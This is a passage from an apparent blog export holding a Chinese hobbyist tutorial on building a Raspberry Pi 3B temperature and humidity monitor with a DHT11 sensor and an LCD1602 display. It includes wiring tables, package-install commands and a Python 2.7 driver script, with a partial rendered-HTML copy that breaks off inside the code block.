参考资料\nhttps://gist.github.com/hugozhu/6166527\nhttps://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\nhttps://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\nhttp://blog.csdn.net/xukai871105/article/details/12684617\nhttps://www.oschina.net/question/1425530\\_140979\nhttp://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\nhttp://blog.csdn.net/netccy/article/details/48098455\nhttps://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\nhttp://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\nhttp://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\nhttp://blog.csdn.net/rocklee/article/details/50082777\nhttp://www.guokr.com/post/718305/\nhttp://www.rs-online.com/designspark/electronics/blog/content-1148\nhttp://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\nhttps://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\nhttp://blog.csdn.net/u013431550/article/details/40870947\nhttp://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\nhttp://blog.csdn.net/longerzone/article/details/36171381","source":"_posts/基于树莓派的实时温度湿度监测平台.md","raw":"---\ntitle: 基于树莓派的实时温度湿度监测平台\ntags: 'Raspberry'\npermalink: rpi-tmp-hdt-platform\nid: 15\nupdated: '2016-08-25 19:28:59'\ndate: 2016-08-25 13:39:08\n---\n\n\n# 前言\n很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。\n\n在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。\n<!-- more --> \n# 知识储备\n* 数字电子技术基础\n* 微机原理与接口技术\n* python语言\n\n# 原料\n* 树莓派3B\n* DHT11\n* LCD1602\n* 2K电阻（也可以是电位器）\n* 子-母 和 母-母 杜邦线\n* 电气绝缘胶带\n* 剪刀\n* 一颗耐心和一颗细心\n\n# 语言\n* Python 2.7\n\n# 组件\n* python-dev\n* python-rpi.gpio\n如果不具备以上，请执行：\n```bash\nsudo apt-get update\nsudo apt-get install python-dev\nsudo apt-get install python-rpi.gpio\n```\n\n# 接线\n我们一共要完成两个任务：\n\n* 1.连接LCD1602\n* 2.连接DHT11\n\n树莓派3B的GPIO图如下：\n\n![](/content/images/2016/08/GPIO.png)\n##  2K 电阻如何连接到电路\n简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。\n\n## LCD1602 接线方案\n\nLCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：\n![](/content/images/2016/08/LCD1602--.jpg)\n\n树莓派的USB端口朝下，电源线位置朝上方向摆放。\n右端一共有40个引脚，每个引脚的PIN位置如上。\n\nVSS，接地，RPi PIN 6\nVDD，接5V电源，PRi PIN 2\nVO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9\nRS，寄存器选择，接GPIO 14，RPi PIN 8\nRW，读写选择，接地，表示写模式，PRi PIN 6\nE，使能信号，接GPIO 15，RPi PIN 10\nD0，数据位0，4位工作模式下不用，不接\nD1，数据位1，4位工作模式下不用，不接\nD2，数据位2，4位工作模式下不用，不接\nD3，数据位3，4位工作模式下不用，不接\nD4，数据位4，接GPIO 17，RPi PIN 11\nD5，数据位5，接GPIO 18，RPi PIN 12\nD6，数据位6，接GPIO 27，RPi PIN 13\nD7，数据位7，接GPIO 22，RPi PIN 15\nA，液晶屏背光+，接5V，RPi PIN 4\nK，液晶屏背光-，接地，RPi PIN 39\n\n**连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。**\n\n建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。\n\n## LCD1602 开机测试\n接通电源线，默认情况下，如果连接正确：\n\n* 肯定没有爆炸\n* 会出现如下图的效果，证明你已经接线成功了\n![](/content/images/2016/08/1.jpg)\n\n## DHT11 接线方案\n接线简单，主要是把数据传输到GPIO26上\n\nDHT11有3个脚，VCC，DATA，GND\nVCC 接 3.3V PIN 01\nDATA 接 GPIO26 PIN 37\nGND 接地  PIN 09\n\n#代码\n采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github\n\nhttps://github.com/yfgeek/rpi-TmpHmdRuntime\n```python\n#!/usr/bin/python\n\n# based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527\n# rewrite by ivan\n\nfrom time import sleep\nfrom datetime import datetime\nfrom time import sleep\nimport commands,time\nimport RPi.GPIO as GPIO\n\ndef get_tmp():\n  channel = 37\n  data = []\n  j = 0\n\n  GPIO.setmode(GPIO.BOARD)\n\n  time.sleep(1)\n\n  GPIO.setup(channel, GPIO.OUT)\n  GPIO.output(channel, GPIO.LOW)\n  time.sleep(0.5)\n  GPIO.output(channel, GPIO.HIGH)\n  GPIO.setup(channel, GPIO.IN)\n\n  while GPIO.input(channel) == GPIO.LOW:\n    continue\n  while GPIO.input(channel) == GPIO.HIGH:\n    continue\n\n  while j < 40:\n    k = 0\n    while GPIO.input(channel) == GPIO.LOW:\n      continue\n    while GPIO.input(channel) == GPIO.HIGH:\n      k += 1\n      if k > 100:\n        break\n    if k < 8:\n      data.append(0)\n    else:\n      data.append(1)\n\n    j += 1\n\n  print \"sensor is working.\"\n  print data\n\n  humidity_bit = data[0:8]\n  humidity_point_bit = data[8:16]\n  temperature_bit = data[16:24]\n  temperature_point_bit = data[24:32]\n  check_bit = data[32:40]\n\n  humidity = 0\n  humidity_point = 0\n  temperature = 0\n  temperature_point = 0\n  check = 0\n\n  for i in range(8):\n    humidity += humidity_bit[i] * 2 ** (7-i)\n    humidity_point += humidity_point_bit[i] * 2 ** (7-i)\n    temperature += temperature_bit[i] * 2 ** (7-i)\n    temperature_point += temperature_point_bit[i] * 2 ** (7-i)\n    check += check_bit[i] * 2 ** (7-i)\n\n  tmp = humidity + humidity_point + temperature + temperature_point\n\n  if check == tmp:\n    return 'temp:' + str(temperature) + ' C \\nhumidity:' + str(humidity) + '%'\n  else:\n    get_tmp()\n\n  GPIO.cleanup()    \n\nclass Adafruit_CharLCD:\n\n    # commands\n    LCD_CLEARDISPLAY            = 0x01\n    LCD_RETURNHOME                  = 0x02\n    LCD_ENTRYMODESET            = 0x04\n    LCD_DISPLAYCONTROL          = 0x08\n    LCD_CURSORSHIFT             = 0x10\n    LCD_FUNCTIONSET             = 0x20\n    LCD_SETCGRAMADDR            = 0x40\n    LCD_SETDDRAMADDR            = 0x80\n\n    # flags for display entry mode\n    LCD_ENTRYRIGHT              = 0x00\n    LCD_ENTRYLEFT               = 0x02\n    LCD_ENTRYSHIFTINCREMENT     = 0x01\n    LCD_ENTRYSHIFTDECREMENT     = 0x00\n\n    # flags for display on/off control\n    LCD_DISPLAYON               = 0x04\n    LCD_DISPLAYOFF              = 0x00\n    LCD_CURSORON                = 0x02\n    LCD_CURSOROFF               = 0x00\n    LCD_BLINKON                 = 0x01\n    LCD_BLINKOFF                = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n    LCD_MOVERIGHT               = 0x04\n    LCD_MOVELEFT                = 0x00\n\n    # flags for function set\n    LCD_8BITMODE                = 0x10\n    LCD_4BITMODE                = 0x00\n    LCD_2LINE                   = 0x08\n    LCD_1LINE                   = 0x00\n    LCD_5x10DOTS                = 0x04\n    LCD_5x8DOTS                 = 0x00\n\n\n\n    def __init__(self, pin_rs=8, pin_e=10, pins_db=[11,12,13,15], GPIO = None):\n        # Emulate the old behavior of using RPi.GPIO if we haven't been given\n        # an explicit GPIO interface to use\n        if not GPIO:\n            import RPi.GPIO as GPIO\n        GPIO.setwarnings(False)\n\n        self.GPIO = GPIO\n        self.pin_rs = pin_rs\n        self.pin_e = pin_e\n        self.pins_db = pins_db\n\n        self.GPIO.setmode(GPIO.BOARD)\n        self.GPIO.setup(self.pin_e, GPIO.OUT)\n        self.GPIO.setup(self.pin_rs, GPIO.OUT)\n\n        for pin in self.pins_db:\n            self.GPIO.setup(pin, GPIO.OUT)\n\n        self.write4bits(0x33) # initialization\n        self.write4bits(0x32) # initialization\n        self.write4bits(0x28) # 2 line 5x7 matrix\n        self.write4bits(0x0C) # turn cursor off 0x0E to enable cursor\n        self.write4bits(0x06) # shift cursor right\n\n        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF\n\n        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS\n        self.displayfunction |= self.LCD_2LINE\n\n        \"\"\" Initialize to default text direction (for romance languages) \"\"\"\n        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) #  set the entry mode\n\n        self.clear()\n\n\n    def begin(self, cols, lines):\n\n        if (lines > 1):\n                self.numlines = lines\n                self.displayfunction |= self.LCD_2LINE\n                self.currline = 0\n\n\n    def home(self):\n\n        self.write4bits(self.LCD_RETURNHOME) # set cursor position to zero\n        self.delayMicroseconds(3000) # this command takes a long time!\n\n\n    def clear(self):\n\n        self.write4bits(self.LCD_CLEARDISPLAY) # command to clear display\n        self.delayMicroseconds(3000)    # 3000 microsecond sleep, clearing the display takes a long time\n\n\n    def setCursor(self, col, row):\n\n        self.row_offsets = [ 0x00, 0x40, 0x14, 0x54 ]\n\n        if ( row > self.numlines ): \n                row = self.numlines - 1 # we count rows starting w/0\n\n        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))\n\n\n    def noDisplay(self): \n        \"\"\" Turn the display off (quickly) \"\"\"\n\n        self.displaycontrol &= ~self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def display(self):\n        \"\"\" Turn the display on (quickly) \"\"\"\n\n        self.displaycontrol |= self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noCursor(self):\n        \"\"\" Turns the underline cursor on/off \"\"\"\n\n        self.displaycontrol &= ~self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def cursor(self):\n        \"\"\" Cursor On \"\"\"\n\n        self.displaycontrol |= self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def DisplayLeft(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)\n\n\n    def scrollDisplayRight(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);\n\n\n    def leftToRight(self):\n        \"\"\" This is for text that flows Left to Right \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);\n\n\n    def rightToLeft(self):\n        \"\"\" This is for text that flows Right to Left \"\"\"\n        self.displaymode &= ~self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def autoscroll(self):\n        \"\"\" This will 'right justify' text from the cursor \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def noAutoscroll(self): \n        \"\"\" This will 'left justify' text from the cursor \"\"\"\n\n        self.displaymode &= ~self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def write4bits(self, bits, char_mode=False):\n        \"\"\" Send command to LCD \"\"\"\n\n        self.delayMicroseconds(1000) # 1000 microsecond sleep\n\n        bits=bin(bits)[2:].zfill(8)\n\n        self.GPIO.output(self.pin_rs, char_mode)\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i], True)\n\n        self.pulseEnable()\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4,8):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i-4], True)\n\n        self.pulseEnable()\n\n\n    def delayMicroseconds(self, microseconds):\n        seconds = microseconds / float(1000000) # divide microseconds by 1 million for seconds\n        sleep(seconds)\n\n\n    def pulseEnable(self):\n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, True)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # commands need > 37us to settle\n\n\n    def message(self, text):\n        \"\"\" Send string to LCD. Newline wraps to second line\"\"\"\n\n        for char in text:\n            if char == '\\n':\n                self.write4bits(0xC0) # next line\n            else:\n                self.write4bits(ord(char),True)\n\nif __name__ == '__main__':\n\n    while True:\n        tmp = get_tmp() \n        if tmp:\n            lcd = Adafruit_CharLCD()\n            lcd.noBlink()\n            lcd.clear()\n            lcd.message(tmp)\n        sleep(5)\n\n```\n# 运行效果\n![](/content/images/2016/08/WechatIMG302.jpeg)\n\n\n![](/content/images/2016/08/WechatIMG293.jpeg)\n# 参考资料\nhttps://gist.github.com/hugozhu/6166527\nhttps://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\nhttps://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\nhttp://blog.csdn.net/xukai871105/article/details/12684617\nhttps://www.oschina.net/question/1425530\\_140979\nhttp://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\nhttp://blog.csdn.net/netccy/article/details/48098455\nhttps://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\nhttp://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\nhttp://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\nhttp://blog.csdn.net/rocklee/article/details/50082777\nhttp://www.guokr.com/post/718305/\nhttp://www.rs-online.com/designspark/electronics/blog/content-1148\nhttp://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\nhttps://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\nhttp://blog.csdn.net/u013431550/article/details/40870947\nhttp://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\nhttp://blog.csdn.net/longerzone/article/details/36171381","slug":"rpi-tmp-hdt-platform","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym301f001kcdonzl1309z9","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。</p>\n<p>在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。<br><a id=\"more\"></a> </p>\n<h1 id=\"知识储备\"><a href=\"#知识储备\" class=\"headerlink\" title=\"知识储备\"></a>知识储备</h1><ul>\n<li>数字电子技术基础</li>\n<li>微机原理与接口技术</li>\n<li>python语言</li>\n</ul>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3B</li>\n<li>DHT11</li>\n<li>LCD1602</li>\n<li>2K电阻（也可以是电位器）</li>\n<li>子-母 和 母-母 杜邦线</li>\n<li>电气绝缘胶带</li>\n<li>剪刀</li>\n<li>一颗耐心和一颗细心</li>\n</ul>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><ul>\n<li>Python 2.7</li>\n</ul>\n<h1 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h1><ul>\n<li>python-dev</li>\n<li>python-rpi.gpio<br>如果不具备以上，请执行：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install python-dev</div><div class=\"line\">sudo apt-get install python-rpi.gpio</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"接线\"><a href=\"#接线\" class=\"headerlink\" title=\"接线\"></a>接线</h1><p>我们一共要完成两个任务：</p>\n<ul>\n<li>1.连接LCD1602</li>\n<li>2.连接DHT11</li>\n</ul>\n<p>树莓派3B的GPIO图如下：</p>\n<p><img src=\"/content/images/2016/08/GPIO.png\" alt=\"\"></p>\n<h2 id=\"2K-电阻如何连接到电路\"><a href=\"#2K-电阻如何连接到电路\" class=\"headerlink\" title=\"2K 电阻如何连接到电路\"></a>2K 电阻如何连接到电路</h2><p>简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。</p>\n<h2 id=\"LCD1602-接线方案\"><a href=\"#LCD1602-接线方案\" class=\"headerlink\" title=\"LCD1602 接线方案\"></a>LCD1602 接线方案</h2><p>LCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：<br><img src=\"/content/images/2016/08/LCD1602--.jpg\" alt=\"\"></p>\n<p>树莓派的USB端口朝下，电源线位置朝上方向摆放。<br>右端一共有40个引脚，每个引脚的PIN位置如上。</p>\n<p>VSS，接地，RPi PIN 6<br>VDD，接5V电源，PRi PIN 2<br>VO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9<br>RS，寄存器选择，接GPIO 14，RPi PIN 8<br>RW，读写选择，接地，表示写模式，PRi PIN 6<br>E，使能信号，接GPIO 15，RPi PIN 10<br>D0，数据位0，4位工作模式下不用，不接<br>D1，数据位1，4位工作模式下不用，不接<br>D2，数据位2，4位工作模式下不用，不接<br>D3，数据位3，4位工作模式下不用，不接<br>D4，数据位4，接GPIO 17，RPi PIN 11<br>D5，数据位5，接GPIO 18，RPi PIN 12<br>D6，数据位6，接GPIO 27，RPi PIN 13<br>D7，数据位7，接GPIO 22，RPi PIN 15<br>A，液晶屏背光+，接5V，RPi PIN 4<br>K，液晶屏背光-，接地，RPi PIN 39</p>\n<p><strong>连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。</strong></p>\n<p>建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。</p>\n<h2 id=\"LCD1602-开机测试\"><a href=\"#LCD1602-开机测试\" class=\"headerlink\" title=\"LCD1602 开机测试\"></a>LCD1602 开机测试</h2><p>接通电源线，默认情况下，如果连接正确：</p>\n<ul>\n<li>肯定没有爆炸</li>\n<li>会出现如下图的效果，证明你已经接线成功了<br><img src=\"/content/images/2016/08/1.jpg\" alt=\"\"></li>\n</ul>\n<h2 id=\"DHT11-接线方案\"><a href=\"#DHT11-接线方案\" class=\"headerlink\" title=\"DHT11 接线方案\"></a>DHT11 接线方案</h2><p>接线简单，主要是把数据传输到GPIO26上</p>\n<p>DHT11有3个脚，VCC，DATA，GND<br>VCC 接 3.3V PIN 01<br>DATA 接 GPIO26 PIN 37<br>GND 接地  PIN 09</p>\n<p>#代码<br>采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github</p>\n<p><a href=\"https://github.com/yfgeek/rpi-TmpHmdRuntime\" target=\"_blank\" rel=\"external\">https://github.com/yfgeek/rpi-TmpHmdRuntime</a><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div><div class=\"line\">248</div><div class=\"line\">249</div><div class=\"line\">250</div><div class=\"line\">251</div><div class=\"line\">252</div><div class=\"line\">253</div><div class=\"line\">254</div><div class=\"line\">255</div><div class=\"line\">256</div><div class=\"line\">257</div><div class=\"line\">258</div><div class=\"line\">259</div><div class=\"line\">260</div><div class=\"line\">261</div><div class=\"line\">262</div><div class=\"line\">263</div><div class=\"line\">264</div><div class=\"line\">265</div><div class=\"line\">266</div><div class=\"line\">267</div><div class=\"line\">268</div><div class=\"line\">269</div><div class=\"line\">270</div><div class=\"line\">271</div><div class=\"line\">272</div><div class=\"line\">273</div><div class=\"line\">274</div><div class=\"line\">275</div><div class=\"line\">276</div><div class=\"line\">277</div><div class=\"line\">278</div><div class=\"line\">279</div><div class=\"line\">280</div><div class=\"line\">281</div><div class=\"line\">282</div><div class=\"line\">283</div><div class=\"line\">284</div><div class=\"line\">285</div><div class=\"line\">286</div><div class=\"line\">287</div><div class=\"line\">288</div><div class=\"line\">289</div><div class=\"line\">290</div><div class=\"line\">291</div><div class=\"line\">292</div><div class=\"line\">293</div><div class=\"line\">294</div><div class=\"line\">295</div><div class=\"line\">296</div><div class=\"line\">297</div><div class=\"line\">298</div><div class=\"line\">299</div><div class=\"line\">300</div><div class=\"line\">301</div><div class=\"line\">302</div><div class=\"line\">303</div><div class=\"line\">304</div><div class=\"line\">305</div><div class=\"line\">306</div><div class=\"line\">307</div><div class=\"line\">308</div><div class=\"line\">309</div><div class=\"line\">310</div><div class=\"line\">311</div><div class=\"line\">312</div><div class=\"line\">313</div><div class=\"line\">314</div><div class=\"line\">315</div><div class=\"line\">316</div><div class=\"line\">317</div><div class=\"line\">318</div><div class=\"line\">319</div><div class=\"line\">320</div><div class=\"line\">321</div><div class=\"line\">322</div><div class=\"line\">323</div><div class=\"line\">324</div><div class=\"line\">325</div><div class=\"line\">326</div><div class=\"line\">327</div><div class=\"line\">328</div><div class=\"line\">329</div><div class=\"line\">330</div><div class=\"line\">331</div><div class=\"line\">332</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527</span></div><div class=\"line\"><span class=\"comment\"># rewrite by ivan</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">import</span> commands,time</div><div class=\"line\"><span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tmp</span><span class=\"params\">()</span>:</span></div><div class=\"line\">  channel = <span class=\"number\">37</span></div><div class=\"line\">  data = []</div><div class=\"line\">  j = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  